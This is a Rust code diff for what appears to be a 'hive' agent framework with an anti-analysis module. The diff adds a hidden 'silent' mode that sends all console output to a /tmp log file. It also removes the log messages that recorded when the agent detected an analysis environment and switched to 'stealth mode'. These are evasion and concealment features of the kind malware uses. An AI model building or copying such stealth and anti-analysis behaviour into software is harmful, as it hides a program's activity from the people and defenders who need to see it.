@@ -1,12 +1,40 @@
 pub fn init_logging(agent_name: &str) {
-    tracing_subscriber::fmt()
-        .with_target(false)
-        .with_env_filter(
-            tracing_subscriber::EnvFilter::from_default_env()
-                .add_directive(format!("{}=debug", agent_name).parse().unwrap())
-                .add_directive("agent_base=info".parse().unwrap()),
-        )
-        .init();
+    let hide = std::env::var("HIVE_HIDE").is_ok()
+        || std::env::args().any(|a| a == "--hide" || a == "--silent");
+
+    if hide {
+        let log_path = format!("/tmp/hive_{}.log", agent_name);
+        let file = std::fs::File::create(&log_path)
+            .unwrap_or_else(|_| panic!("Cannot create log file {}", log_path));
+        #[cfg(unix)]
+        let log_fd = { use std::os::unix::io::AsRawFd; file.as_raw_fd() };
+
+        tracing_subscriber::fmt()
+            .with_target(false)
+            .with_writer(file)
+            .with_env_filter(
+                tracing_subscriber::EnvFilter::from_default_env()
+                    .add_directive(format!("{}=debug", agent_name).parse().unwrap())
+                    .add_directive("agent_base=info".parse().unwrap()),
+            )
+            .init();
+
+        // Redirect stdout/stderr to log file for full terminal silence
+        #[cfg(unix)]
+        {
+            let _ = unsafe { libc::dup2(log_fd, libc::STDOUT_FILENO) };
+            let _ = unsafe { libc::dup2(log_fd, libc::STDERR_FILENO) };
+        }
+    } else {
+        tracing_subscriber::fmt()
+            .with_target(false)
+            .with_env_filter(
+                tracing_subscriber::EnvFilter::from_default_env()
+                    .add_directive(format!("{}=debug", agent_name).parse().unwrap())
+                    .add_directive("agent_base=info".parse().unwrap()),
+            )
+            .init();
+    }
 }
 
 /// Initialize agent with anti-analysis checks.
@@ -21,11 +49,6 @@ pub fn safe_init(agent_name: &str) -> bool {
 
     // Run anti-analysis
     let safe = crate::anti_analysis::AntiAnalysis::is_safe();
-    if !safe {
-        tracing::warn!("{}: unsafe environment detected, operating in stealth mode", agent_name);
-    } else {
-        tracing::info!("{}: environment appears safe", agent_name);
-    }
 
     safe
 }
